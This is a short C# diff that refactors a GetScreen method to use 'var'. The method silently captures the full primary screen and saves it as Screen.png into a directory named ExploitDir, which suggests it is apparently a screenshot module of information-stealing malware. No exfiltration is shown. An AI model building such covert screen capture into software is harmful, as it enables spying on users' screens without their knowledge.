@@ -7,10 +7,10 @@ namespace Checker
     {
         public static void GetScreen()
         {
-            string SDir = Help.ExploitDir;
-            int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
-            int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
-            Bitmap bitmap = new Bitmap(width, height);
+            var SDir = Help.ExploitDir;
+            var width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
+            var height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
+            var bitmap = new Bitmap(width, height);
             Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
             bitmap.Save(SDir + $"\\Screen.png", ImageFormat.Png);
         }
